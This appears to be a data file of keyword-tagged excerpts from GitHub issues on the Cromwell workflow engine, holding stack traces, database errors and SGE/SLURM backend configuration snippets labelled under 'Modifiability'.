Modifiability,rationValidation$$anonfun$fromDeclarations$1.apply(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$$anonfun$fromDeclarations$1.apply(DeclarationValidation.scala:17); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2114,Config,ConfigInitializationActor,2114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['Config'],['ConfigInitializationActor']
Modifiability,rawls production does use rewriteBatchedStatements=true (see https://github.com/broadinstitute/firecloud-develop/blob/prod/configs/rawls/rawls.conf.ctmpl). You need to use it in conjunction with ```tableQuery ++= collection``` instead of ```tableQuery += item```. How are you measuring the effect? I have noticed that jProfiler will still count the inserts individually. I think the slick logs show the right thing. But this is some magic that happens inside the JDBC layer so it is hard to tell what is actually happening. I would suggest running with a local mysql with the general query log on http://dev.mysql.com/doc/refman/5.7/en/query-log.html.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846704:26,rewrite,rewriteBatchedStatements,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846704,2,"['config', 'rewrite']","['configs', 'rewriteBatchedStatements']"
Modifiability,"rce); * [io.circe:circe-generic](https://github.com/circe/circe); * [io.circe:circe-generic-extras](https://github.com/circe/circe-generic-extras); * [io.circe:circe-literal](https://github.com/circe/circe); * [io.circe:circe-optics](https://github.com/circe/circe-optics); * [io.circe:circe-parser](https://github.com/circe/circe); * [io.circe:circe-refined](https://github.com/circe/circe); * [io.circe:circe-shapes](https://github.com/circe/circe). from 0.13.0 to 0.14.1.; [GitHub Release Notes](https://github.com/circe/circe/releases/tag/v0.14.1) - [Version Diff](https://github.com/circe/circe/compare/v0.13.0...v0.14.1). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/92f43ce5f010fa03daeb2625a3f9c1b1be80cca5/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (0.13.0).; You might want to review and update them manually.; ```; centaur/src/main/resources/integrationTestCases/cwl/bcbio/gvcf-joint-workflow/steps/process_alignment.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/gvcf-joint-workflow/steps/variantcall_batch_region.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/prealign-workflow/steps/variantcall_batch_region.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/rnaseq-workflow/steps/prepare_sample.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/somatic-workflow/steps/detect_sv.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/somatic-workflow/steps/process_alignment.cwl; centaur/src/main/resources/integrationTestCases/cwl/bcbio/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6410:1105,config,configuration,1105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6410,1,['config'],['configuration']
Modifiability,"rcion defined from '1' of type 'eu.timepit.refined.api.Refined' to 'Int'.; at wom.types.WomType.coerceRawValue(WomType.scala:36); at wom.types.WomType.coerceRawValue$(WomType.scala:27); at wom.types.WomIntegerType$.coerceRawValue(WomIntegerType.scala:9); at cromwell.backend.impl.sfs.config.DeclarationValidation.$anonfun$extractWdlValueOption$1(DeclarationValidation.scala:113); at scala.Option.map(Option.scala:146); at cromwell.backend.impl.sfs.config.DeclarationValidation.extractWdlValueOption(DeclarationValidation.scala:113); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.$anonfun$runtimeAttributeInputs$1(ConfigAsyncJobExecutionActor.scala:163). <!-- Which backend are you running? -->; I use the SGE backend ; <!-- Paste/Attach your workflow if possible: -->; this is my WDL workflow; """"""; workflow testsge{; String Outdir; String JobName=""filter""; call filter{input:outdir=Outdir,jobname=JobName}; }. task filter{; String outdir; String jobname; command<<<; echo ""test successful"" >>${outdir}/log.stdout; echo 1; perl -we '{print STDERR 2;}'; Script=""${jobname}""; Sleep=$SGE_TASK_ID; QsubRcControl=3; QsubType=1; >>>; runtime{; backend:""SGE""; memory:""1 GB""; sge_queue:""test.q -P test -t 1-3""; sge_project:""test""; jobs_name:""${jobname}""; }; output{; String presuccess=""done""; Int rc=read_lines(stdout())[0]; }; }; """"""; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; this my runtime-attributes setting in the reference.conf file. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? jobs_name; String? sge_queue; String? sge_project; """""". submit = """"""; qsub \; -clear \; -terse \; -N ${job_name} \; -wd ${cwd}/execution \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb +""g,num_proc="" + cpu} \; ${""-q "" + sge_queue} \; -binding ${""linear:"" + cpu} \; ${script} | perl -ne 's/\..*//;print;'; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3805:2252,config,configuration,2252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3805,1,['config'],['configuration']
Modifiability,"re of real-time cost monitoring/control (thanks to @TimothyTickle for the suggestion). Monitoring is done using the new ""monitoring action"" for PAPIv2, which currently uses the hard-coded [quay.io/broadinstitute/cromwell-monitor](https://quay.io/repository/broadinstitute/cromwell-monitor) image, built from https://github.com/broadinstitute/cromwell-monitor (I wasn't sure if that code belonged here or in a separate repo). This is advantageous to just using it as a _monitoring_script_, because it removes all assumptions on the ""user"" Docker image (for the task itself). For example, we don't have to assume a particular distribution or presence of Python and its libraries. So it should work exactly the same for any task. Per @geoffjentry's suggestion, we've [consulted](https://groups.google.com/forum/#!topic/google-genomics-discuss/caYM7oHbfx0) with the Google Genomics team, and they don't see any apparent issues with the concept. We could expose this as a workflow option like `monitoring_image`, and allow configuring it at the Cromwell level, so e.g. any user of Terra (or any other hosted Cromwell with PAPIv2 backend) could get usage reports without having to configure anything. The metrics are reported in their GCP project, so a user gets automatic access to them as long as they're a viewer. We could also easily expose a link to workflow- and task-level reports in Job Manager UI, so they will be literally point-and-click away. Each timepoint is designed to be self-sufficient, as it is labeled with:; - Cromwell-specific values, such as workflow ID, task call name, index and attempt.; - GCP instance values such as instance name, zone, number of CPU cores, total memory and disk size. Here's an example graph of cpu/memory/disk utilization for one of our production workflows, as it is running right now - one can already see we could probably save ~40% of the cost:; <img width=""1869"" alt=""screen shot 2019-01-02 at 4 43 20 pm"" src=""https://user-images.githubusercontent.com/13",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510:2281,config,configuring,2281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510,1,['config'],['configuring']
Modifiability,"re, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1798,config,config,1798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['config'],['config']
Modifiability,"re_metadata.xml::causedByLists::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:1963,adapt,adapted,1963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['adapt'],['adapted']
Modifiability,"really clear comments in the config file, nice",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231378728:29,config,config,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231378728,2,['config'],['config']
Modifiability,"rectory; input_dir: fastqc_execute/output_directory; out: [output_directory]; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more. <!-- SLURM backend configuration -->; include required(classpath(""application"")). backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String queue = ""cpu""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). # exit-code-timeout-seconds = 120. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560:1964,config,config,1964,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"red(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }; workflow-options {; workflow-log-temporary = false; }; backend {; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; filesystems {; local {; caching {; # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:; duplication-strategy: [; ""soft-link"", ""copy""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # Default: file; hashing-strategy: ""path""; }; }; }; ...; backend.default = SGE; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql://0.0.0.0:40001/testuser_db?useSSL=false&rewriteBatchedStatements=true""; user = ""fake""; password = ""fake""; driver = ""com.mysql.jdbc.Driver""; connectionTimeout = 5000; }; }. system {; # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; lines = 128000000; string = 128000000; json = 128000000; tsv = 128000000; map = 128000000; object = 128000000; }; }. ```. <!-- Paste/Attach your workflow if possible: -->; a modified version of : https://github.com/gatk-workflows/gatk4-data-processing. [workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log](https://github.com/broadinstitute/cromwell/files/2143529/workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log). A workflow is failing. It looks like cromwell attempts to localise some folder, ; ```/share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/0263ce1e-e1da-44c4-a49f-56fea7a6e1ea/call-SamToFastqAndBwaMem/inputs/-21323395/cromwell -> /share/ScratchGeneral/evaben/cromwell```; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825:1048,rewrite,rewriteBatchedStatements,1048,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,reference slick docs in our db config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3121:31,config,config,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3121,1,['config'],['config']
Modifiability,"release to link to only ""stable"" assets. However, the Runtime Attributes link on the [Call Caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) page links to the develop version of the documentation instead. Similarly, the 'Example Providers Folder' section of the [Configuration](https://cromwell.readthedocs.io/en/stable/Configuring/) page links to the `develop` branch:; > You can find a description of options and example stanzas in the [Cromwell Example Configuration](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf), along with backend provider examples in the [Example Providers Folder](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.example.backends).; 4. After seeing that a big perf bottleneck was Cromwell hashing files, I enabled all of the call caching options and also enabled `check-sibling-md5` so that it could use pre-computed hashes instead. To my surprise, this did nothing because it only works when the configured `actor-factory` is `cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory`! The documentation does **not** make that sufficiently clear:; - The `hashing-strategy` and `check-sibling-md5` options are listed under the `Local Filesystem` section (and configured under `config.filesystems.local.caching` which led me to believe they would work with any provider configured for local filesystem (e.g., TES). This is not the case, and they are in fact tied to the actor factory implementation and the only actor factory with support is `ConfigBackendLifecycleActorFactory` (as far as I could tell).; - The documentation does make mention of mention:; > When running a job on the **Config (Shared Filesystem) backend**, Cromwell provides some additional options in the backend's config section. However neither a Config nor a Shared Filesystem backend are mentionend in the documentation, although SFS is found under [Filesystems](https://cromwell.readthedocs.io/en/stab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4810:2261,config,configured,2261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4810,1,['config'],['configured']
Modifiability,remove the $HOME/.config/gcloud/gce file before each gsutil invocation [BA-6161],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5361:18,config,config,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5361,1,['config'],['config']
Modifiability,reparedStatement.performPreExecute(Unknown Source); 	... 42 common frames omitted; Caused by: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.persist.LobStoreMem.setBlockBytes(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesISNormal(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesIS(Unknown Source); 	at org.hsqldb.persist.LobManager.setCharsForNewClob(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.addBatch(Unknown Source); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.addBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15(JdbcActionComponent.scala:531); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15$adapted(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1955/223664727.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71). 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$14(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1954/1995472759.apply(Unknown Source); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement(JdbcBackend.scala:372); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement$(JdbcBackend.scala:367); 	at slick.jdbc.JdbcBackend$BaseSessi,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:15975,adapt,adapted,15975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['adapt'],['adapted']
Modifiability,reparedStatement.performPreExecute(Unknown Source); 	... 42 common frames omitted; Caused by: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.persist.LobStoreMem.setBlockBytes(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesISNormal(Unknown Source); 	at org.hsqldb.persist.LobManager.setBytesIS(Unknown Source); 	at org.hsqldb.persist.LobManager.setCharsForNewClob(Unknown Source); 	at org.hsqldb.SessionData.allocateLobForResult(Unknown Source); 	at org.hsqldb.Session.allocateResultLob(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.performPreExecute(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.addBatch(Unknown Source); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.addBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15(JdbcActionComponent.scala:531); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15$adapted(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1955/223664727.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$14(JdbcActionComponent.scala:529); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$Lambda$1954/1995472759.apply(Unknown Source); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement(JdbcBackend.scala:372); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement$(JdbcBackend.scala:367); 	at slick.jdbc.JdbcBackend$BaseSessi,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:6826,adapt,adapted,6826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['adapt'],['adapted']
Modifiability,"rides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell will cap the number of running workflows at N; #max-concurrent-workflows = 5000. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; #max-workflow-launch-count = 50. # Number of seconds between workflow launches; #new-workflow-poll-rate = 20. # Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; #number-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:1896,config,configurable,1896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['config'],['configurable']
Modifiability,"ridss/gridss.sh\"",\n \""arguments\"": [\n {\n \""prefix\"": \""--threads\"",\n \""valueFrom\"": \""$get_threads_val(inputs)\""\n }\n ],\n \""inputs\"": [\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Optional - location of the GRIDSS assembly BAM. This file will be created by GRIDSS.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--assembly\""\n },\n \""default\"": \"".assembly.bam\"",\n \""id\"": \""#gridss-2.9.4.cwl/assembly\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional - BED file containing regions to ignore\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--blacklist\""\n },\n \""id\"": \""#gridss-2.9.4.cwl/blacklist\""\n },\n {\n \""type\"": \""string\"",\n \""doc\"": \""portion of 6 sigma read pairs distribution considered concordantly mapped. Default: 0.995\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--concordantreadpairdistribution\""\n },\n \""default\"": \""0.995\"",\n \""id\"": \""#gridss-2.9.4.cwl/concordantreadpairdistribution\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional - configuration file use to override default GRIDSS settings.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--configuration\""\n },\n \""id\"": \""#gridss-2.9.4.cwl/configuration\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - use the system version of bwa instead of the in-process version packaged with GRIDSS\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--externalaligner\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/externalaligner\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Optional - location of GRIDSS jar\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jar\""\n },\n \""default\"": \""/opt/gridss/gridss-2.9.4-gridss-jar-with-dependencies.jar\"",\n \""id\"": \""#gridss-2.9.4.cwl/jar\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""zero-based assembly job index (only required when performing parallel assembly across multiple computers)\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jobindex\""\n },\n \""default\""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:73446,config,configuration,73446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['config'],['configuration']
